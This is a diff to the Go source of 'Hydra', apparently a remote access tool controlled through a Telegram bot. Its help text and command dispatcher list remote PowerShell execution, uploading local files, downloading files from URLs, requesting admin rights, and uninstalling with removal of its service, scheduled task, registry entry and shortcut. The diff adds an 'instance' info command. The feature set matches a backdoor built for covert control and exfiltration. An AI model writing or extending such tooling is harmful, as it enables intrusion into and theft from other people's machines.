@@ -13,7 +13,8 @@ const (
 	help = "```\nhelp - display this help message\nping - measure the latency of command execution\n" +
 		"reset - create a new Genesis message\ninfo - display system information\nsoftware - display the list of installed programs\n" +
 		"sh - execute a PowerShell command and return the output\nfile - upload a file from the local system\n" +
-		"dl - download a file from a url to the local system\nroot - ask for admin permissions\nremove - uninstall Hydra\n```"
+		"dl - download a file from a url to the local system\nroot - ask for admin permissions\nremove - uninstall Hydra\n" +
+		"instance - returns informtaion about Hydra\n```"
 	fmtUninstall = "```\nRemoving all traces of Hydra...\n\nService: %v\nTask: %v\nRegistry: %v\nShortcut: %v\n\nBye!\n```"
 	unknown      = "Wat is this? America explain!!"
 )
@@ -58,6 +59,8 @@ func Perform(message *tgbotapi.Message) {
 		Shell(message.CommandArguments())
 	case "file":
 		UploadFile(message.CommandArguments())
+	case "instance":
+		InstanceInfo()
 	case "remove":
 		sendUninstall()
 	default:
